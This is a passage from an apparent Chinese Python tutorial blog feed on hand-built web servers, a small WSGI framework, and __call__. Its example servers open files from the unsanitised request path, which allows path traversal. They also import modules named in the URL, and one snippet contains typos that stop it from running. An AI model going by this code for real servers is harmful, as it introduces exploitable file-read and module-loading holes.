id="0x02-Web框架代码（MyWebFramework-py）"><a href="#0x02-Web框架代码（MyWebFramework-py）" class="headerlink" title="0x02 Web框架代码（MyWebFramework.py）"></a>0x02 Web框架代码（MyWebFramework.py）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># from MyWebServer import HTTPServer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态文件根目录</span></span><br><span class="line">HTML_ROOT_DIR = <span class="string">"./html"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""框架的核心部分，也就是框架的主题程序，框架是通用的"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, urls)</span>:</span></span><br><span class="line">        <span class="comment"># 设置路由信息</span></span><br><span class="line">        self.urls = urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, env, start_response)</span>:</span></span><br><span class="line">        path = env.get(<span class="string">"PATH_INFO"</span>, <span class="string">"/"</span>)</span><br><span class="line">        <span class="comment"># /static/index.html</span></span><br><span class="line">        <span class="keyword">if</span> path.startswith(<span class="string">"/static"</span>):</span><br><span class="line">            <span class="comment"># 要访问静态文件</span></span><br><span class="line">            file_name = path[<span class="number">7</span>:]</span><br><span class="line">            <span class="comment"># 打开文件，读取内容</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(HTML_ROOT_DIR + file_name, <span class="string">"rb"</span>)</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="comment"># 代表未找到路由信息，404错误</span></span><br><span class="line">                status = <span class="string">"404 Not Found"</span></span><br><span class="line">                headers = []</span><br><span class="line">                start_response(status, headers)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"not found"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_data = file.read()</span><br><span class="line">                file.close()</span><br><span class="line"></span><br><span class="line">                status = <span class="string">"200 OK"</span></span><br><span class="line">                headers = []</span><br><span class="line">                start_response(status, headers)</span><br><span class="line">                <span class="keyword">return</span> file_data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> url, handler <span class="keyword">in</span> self.urls:</span><br><span class="line">            <span class="comment">#("/ctime", show_ctime)</span></span><br><span class="line">            <span class="keyword">if</span> path == url:</span><br><span class="line">                <span class="keyword">return</span> handler(env, start_response)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 代表未找到路由信息，404错误</span></span><br><span class="line">        status = <span class="string">"404 Not Found"</span></span><br><span class="line">        headers = []</span><br><span class="line">        start_response(status, headers)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"not found"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_ctime</span><span class="params">(env, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">"200 OK"</span></span><br><span class="line">    headers = [</span><br><span class="line">        (<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>)</span><br><span class="line">    ]</span><br><span class="line">    start_response(status, headers)</span><br><span class="line">    <span class="keyword">return</span> time.ctime()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_hello</span><span class="params">(env, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">"200 OK"</span></span><br><span class="line">    headers = [</span><br><span class="line">        (<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>)</span><br><span class="line">    ]</span><br><span class="line">    start_response(status, headers)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello world"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_haha</span><span class="params">(env, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">"200 OK"</span></span><br><span class="line">    headers = [</span><br><span class="line">        (<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>)</span><br><span class="line">    ]</span><br><span class="line">    start_response(status, headers)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello big world"</span></span><br><span class="line"></span><br><span class="line">urls = [</span><br><span class="line">            (<span class="string">"/"</span>, show_ctime),</span><br><span class="line">            (<span class="string">"/ctime"</span>, show_ctime),</span><br><span class="line">            (<span class="string">"/sayhello"</span>, say_hello),</span><br><span class="line">            (<span class="string">"/sayhaha"</span>, say_haha),</span><br><span class="line">        ]</span><br><span class="line">app = Application(urls)</span><br><span class="line"><span class="comment"># if __name__ == "__main__":</span></span><br><span class="line"><span class="comment">#     urls = [</span></span><br><span class="line"><span class="comment">#             ("/", show_ctime),</span></span><br><span class="line"><span class="comment">#             ("/ctime", show_ctime),</span></span><br><span class="line"><span class="comment">#             ("/sayhello", say_hello),</span></span><br><span class="line"><span class="comment">#             ("/sayhaha", say_haha),</span></span><br><span class="line"><span class="comment">#         ]</span></span><br><span class="line"><span class="comment">#     app = Application(urls)</span></span><br><span class="line"><span class="comment">#     http_server = HTTPServer(app)</span></span><br><span class="line"><span class="comment">#     http_server.bind(8000)</span></span><br><span class="line"><span class="comment">#     http_server.start()</span></span><br></pre></td></tr></table></figure><h4 id="2-1-call"><a href="#2-1-call" class="headerlink" title="2.1 __call__"></a>2.1 <code>__call__</code></h4><ul><li>在Python中，函数其实是一个对象：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f=abs</span><br><span class="line">f.__name__</span><br></pre></td></tr></table></figure><pre><code>&apos;abs&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(<span class="number">-123</span>)</span><br></pre></td></tr></table></figure><pre><code>123由于 f 可以被调用，所以，f 被称为可调用对象。所有的函数都是可调用对象。一个类实例也可以变成一个可调用对象，只需要实现一个特殊方法__call__()。</code></pre><ul><li>我们把 Person 类变成一个可调用对象：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, gender)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.gender = gender</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, friend)</span>:</span></span><br><span class="line">        print(<span class="string">'My name is %s...'</span> % self.name)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'My friend is %s...'</span> % friend)</span><br></pre></td></tr></table></figure><ul><li>可以对 Person 实例直接调用：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = Person(<span class="string">'Bob'</span>, <span class="string">'male'</span>)</span><br><span class="line">p(<span class="string">"Tim"</span>)</span><br></pre></td></tr></table></figure><pre><code>My name is Bob...My friend is Tim...单看 p(&apos;Tim&apos;) 你无法确定 p 是一个函数还是一个类实例，所以，在Python中，函数也是对象，对象和函数的区别并不显著。</code></pre><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20410web03.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.5 python-Web动态服务器-1</title>
      <link href="/2020/04/08/1.5%20python-Web%E5%8A%A8%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1/"/>
      <url>/2020/04/08/1.5%20python-Web%E5%8A%A8%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1/</url>
      
        <content type="html"><![CDATA[<h2 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h2><ul><li>服务器动态资源请求相关知识（WSGI）</li><li>python实现Web动态服务器示例</li></ul><a id="more"></a><h2 id="0x01-服务器动态资源请求"><a href="#0x01-服务器动态资源请求" class="headerlink" title="0x01 服务器动态资源请求"></a>0x01 服务器动态资源请求</h2><h3 id="1-1-浏览器请求动态页面过程"><a href="#1-1-浏览器请求动态页面过程" class="headerlink" title="1.1 浏览器请求动态页面过程"></a>1.1 浏览器请求动态页面过程</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web01.png" alt=""></p><h3 id="1-2-WSGI"><a href="#1-2-WSGI" class="headerlink" title="1.2 WSGI"></a>1.2 WSGI</h3><blockquote><p>Web服务器网关接口（Python Web Server Gateway Interface，缩写为WSGI）是为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口</p></blockquote><p>怎么在你刚建立的Web服务器上运⾏⼀个Django应用和Flask应用，如何不做任何改变而适应不同的web架构呢？</p><p>在以前，选择Python web架构会受制于可用的web服务器    ，反之亦然。 如果架构和服务器可以协同⼯作，那就好了：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web02.png" alt=""></p><p>但有可能面对（或者曾有过）下⾯的问题，当要把⼀个服务器和⼀个架构结合起来时，却发现他们不是被设计成协同⼯作的：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web03.png" alt=""></p><p>那么，怎么可以不修改服务器和架构代码⽽确保可以在多个架构下运⾏web 服务器呢？答案就是Python    Web    Server    Gateway    Interface    (或简称 WSGI，读作“wizgy”)。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web04.png" alt=""></p><ul><li>WSGI允许开发者将选择web框架和web服务器分开。可以混合匹配web服务 器和web框架，选择⼀个适合的配对。⽐如,可以在Gunicorn或者 Nginx/uWSGI    或者Waitress上运⾏Django,Flask,或    Pyramid。真正的混合 匹配，得益于WSGI同时⽀持服务器和架构：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web05.png" alt=""></li></ul><p>web服务器必须具备WSGI接⼝，所有的现代Python  Web框架都已具备WSGI接口，它让你不对代码作修改就能使服务器和特点的web框架协同⼯作。<br>WSGI由web服务器支持，⽽web框架允许你选择适合自己的配对，但它同样对于服务器和框架开发者提供便利使他们可以专注于自己偏爱的领域和专长 而不至于相互牵制。其他语言也有类似接⼝：java有Servlet    API，Ruby有 Rack。</p><h3 id="1-3-定义WSGI接口"><a href="#1-3-定义WSGI接口" class="headerlink" title="1.3 定义WSGI接口"></a>1.3 定义WSGI接口</h3><p>WSGI接⼝定义⾮常简单，它只要求Web开发者实现⼀个函数，就可以响应 HTTP请求。我们来看⼀个最简单的Web版本的“Hello    World!”：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apllication</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    start_reponse(<span class="string">'200 ok'</span>,[(<span class="string">'Content-Type'</span>,<span class="string">'text/html'</span>)])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br></pre></td></tr></table></figure><p>上⾯的pplication()函数就是符合WSGI标准的⼀个HTTP处理函数，它接收两个参数：</p><ul><li>environ：一个包含所有HTTP请求信息的dict对象</li><li>start_response：一个发送HTTP响应的函数</li></ul><p>整个application()函数本身没有涉及到任何解析HTTP的部分，也就是说，把底层web服务器解析部分和应用程序逻辑部分进行了分离，这样开发者就可以专⼼做⼀个领域了</p><p>不过，这个application()函数怎么调用？如果我们自己调用，两个参数environ和start_response我们没法提供，返回的str也没法发给浏览器。</p><p>所以application()函数必须由WSGI服务器来调用。有很多符合WSGI规范的服务器。而我们此时的web服务器项目的目的就是做一个可以解析静态网页还可以解析动态网页的服务器</p><h2 id="0x02-python-Web动态服务器示例"><a href="#0x02-python-Web动态服务器示例" class="headerlink" title="0x02 python-Web动态服务器示例"></a>0x02 python-Web动态服务器示例</h2><h3 id="2-1-本地Pycharm布置目录"><a href="#2-1-本地Pycharm布置目录" class="headerlink" title="2.1 本地Pycharm布置目录"></a>2.1 本地Pycharm布置目录</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web06.png" alt=""></p><h3 id="2-2-web服务器代码（04-dynamic-web-server-py）"><a href="#2-2-web服务器代码（04-dynamic-web-server-py）" class="headerlink" title="2.2 web服务器代码（04_dynamic_web_server.py）"></a>2.2 web服务器代码（04_dynamic_web_server.py）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态文件根目录</span></span><br><span class="line">HTML_ROOT_DIR = <span class="string">"./html"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置动态执行文件目录</span></span><br><span class="line">WSGI_PYTHON_DIR = <span class="string">"./wsgipython"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPserver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""init"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.server_socket.listen(<span class="number">128</span>)</span><br><span class="line">        <span class="string">"""多进程处理请求"""</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, client_address = self.server_socket.accept()</span><br><span class="line">            print(<span class="string">"[%s,%s]用户连接上了"</span> % client_address)</span><br><span class="line">            handle_client_process = Process(target=self.handle_client, args=(client_socket,))</span><br><span class="line">            handle_client_process.start()</span><br><span class="line">            client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_response</span><span class="params">(self,status,headers)</span>:</span></span><br><span class="line">        <span class="comment"># 分析： start_response 处理响应的状态码和头部信息</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">           status = "200 OK"</span></span><br><span class="line"><span class="string">      headers = [</span></span><br><span class="line"><span class="string">          ("Content-Type", "text/plain")</span></span><br><span class="line"><span class="string">      ]</span></span><br><span class="line"><span class="string">      star</span></span><br><span class="line"><span class="string">          """</span></span><br><span class="line">        response_headers = <span class="string">"HTTP/1.1 "</span>+ status + <span class="string">"\r\n"</span></span><br><span class="line">        <span class="keyword">for</span> header <span class="keyword">in</span> headers:</span><br><span class="line">            response_headers += <span class="string">"%s: %s\r\n"</span> % header</span><br><span class="line">        self.response_headers = response_headers</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_client</span><span class="params">(self, client_socket)</span>:</span></span><br><span class="line">        <span class="string">"""处理客户端请求"""</span></span><br><span class="line">        <span class="comment"># 获取客户端数据</span></span><br><span class="line">        request_data = client_socket.recv(<span class="number">2048</span>)</span><br><span class="line">        print(<span class="string">"request data:"</span>,request_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理请求数据</span></span><br><span class="line">        request_lines = request_data.splitlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> request_lines:</span><br><span class="line">            print(line)</span><br><span class="line">        <span class="comment"># 解析请求报文</span></span><br><span class="line">        <span class="comment"># "GET / HTTP/1.1"</span></span><br><span class="line">        request_start_line = request_lines[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取用户请求的文件名</span></span><br><span class="line">        file_name = re.match(<span class="string">r"\w+ +(/[^ ]*)"</span>,request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 提取用户请求的方法</span></span><br><span class="line">        method = re.match(<span class="string">r"(\w+) +/[^ ]* "</span>, request_start_line.decode(<span class="string">"utf-8"</span>)).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># "/ctime.py"</span></span><br><span class="line">        <span class="comment"># "/sayhello.py"</span></span><br><span class="line">        <span class="comment"># 判断是否为动态资源请求</span></span><br><span class="line">        <span class="keyword">if</span> file_name.endswith(<span class="string">".py"</span>):</span><br><span class="line">            <span class="comment"># try使用提升容错率：也即访问的资源不存在时给出提示</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># __import__魔术方法，导入已经创建的py模块，类似import</span></span><br><span class="line">                <span class="comment"># m这里以模块使用</span></span><br><span class="line">                m = __import__(file_name[<span class="number">1</span>:<span class="number">-3</span>])</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="comment"># 使用self.response_headers为服务器添加属性</span></span><br><span class="line">                self.response_headers = <span class="string">"HTTP/1.1 404 Not Found\r\n"</span></span><br><span class="line">                response_body= <span class="string">"not found"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 字典表示请求的相关信息</span></span><br><span class="line">                env = &#123;</span><br><span class="line">                    <span class="string">"PATH_INFO"</span>:file_name,</span><br><span class="line">                    <span class="string">"METHOD"</span>:method</span><br><span class="line">                &#125;</span><br><span class="line">                response_body = m.application(env,self.start_response)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># response 服务器响应浏览器请求的数据</span></span><br><span class="line">            response = self.response_headers+ <span class="string">"\r\n"</span> + response_body</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"/"</span> == file_name:</span><br><span class="line">                file_name= <span class="string">"/index.html"</span></span><br><span class="line">            <span class="comment"># 打开文件</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(HTML_ROOT_DIR+file_name,<span class="string">"rb"</span>)</span><br><span class="line">            <span class="keyword">except</span> IOError:</span><br><span class="line">                <span class="comment"># 构造响应数据</span></span><br><span class="line">                response_start_line = <span class="string">"HTTP/1.1 404 Not Found\r\n"</span></span><br><span class="line">                response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">                response_body = <span class="string">"file is not found!"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_data = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="comment"># 构造响应数据</span></span><br><span class="line">                response_start_line = <span class="string">"HTTP/1.1 200 0k\r\n"</span></span><br><span class="line">                response_headers = <span class="string">"Server: My testserver\r\n"</span></span><br><span class="line">                response_body = file_data.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            response = response_start_line + response_headers+ <span class="string">"\r\n"</span>+ response_body</span><br><span class="line">            print(<span class="string">"response:"</span>,response)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向客户端发送数据</span></span><br><span class="line">        client_socket.send(bytes(response,<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="comment"># 关闭客户端连接</span></span><br><span class="line">        client_socket.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bind</span><span class="params">(self,port)</span>:</span></span><br><span class="line">        self.server_socket.bind((<span class="string">""</span>, port))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 利用sys模块导入路径</span></span><br><span class="line">    sys.path.insert(<span class="number">1</span>, WSGI_PYTHON_DIR)</span><br><span class="line">    http_server = HTTPserver()</span><br><span class="line">    http_server.bind(<span class="number">8000</span>)</span><br><span class="line">    http_server.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="2-3-动态执行脚本（ctime-py）代码："><a href="#2-3-动态执行脚本（ctime-py）代码：" class="headerlink" title="2.3 动态执行脚本（ctime.py）代码："></a>2.3 动态执行脚本（ctime.py）代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># "/ctime.py?timezone=e8"</span></span><br><span class="line"><span class="comment"># "/ctime.py?timezone=e1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(env, start_response)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># env.get("Method")</span></span><br><span class="line">    <span class="comment"># env.get("PATH_INFO")</span></span><br><span class="line">    <span class="comment"># env.get("QUERY_STRING")</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    分析1：env保存的是http的请求，apllication 函数利用env相关信息进行处理</span></span><br><span class="line"><span class="string">    分析2： 浏览器动态请求的页面，再次通过服务器响应至浏览器端，状态码，和头部信息需在apllication中处理</span></span><br><span class="line"><span class="string">    分析3：start_response函数用来处理响应的状态status和响应头headers返回至dynamic_web_server服务器</span></span><br><span class="line"><span class="string">    分析4：return 返回内容，也即是响应体response_body内容</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    status = <span class="string">"200 OK"</span></span><br><span class="line">    headers = [</span><br><span class="line">        (<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    start_response(status, headers)</span><br><span class="line">    <span class="keyword">return</span> time.ctime()</span><br></pre></td></tr></table></figure><h3 id="2-4-执行流程图"><a href="#2-4-执行流程图" class="headerlink" title="2.4 执行流程图"></a>2.4 执行流程图</h3><ul><li>大概画了一下<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web08.png" alt=""></li></ul><h3 id="2-5-测试"><a href="#2-5-测试" class="headerlink" title="2.5 测试"></a>2.5 测试</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20408web07.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-Web服务器】1.4 python-Web静态服务器-3-使用类</title>
      <link href="/2020/04/08/1.4%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-3-%E4%BD%BF%E2%BD%A4%E7%B1%BB/"/>
      <url>/2020/04/08/1.4%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-3-%E4%BD%BF%E2%BD%A4%E7%B1%BB/</url>
      
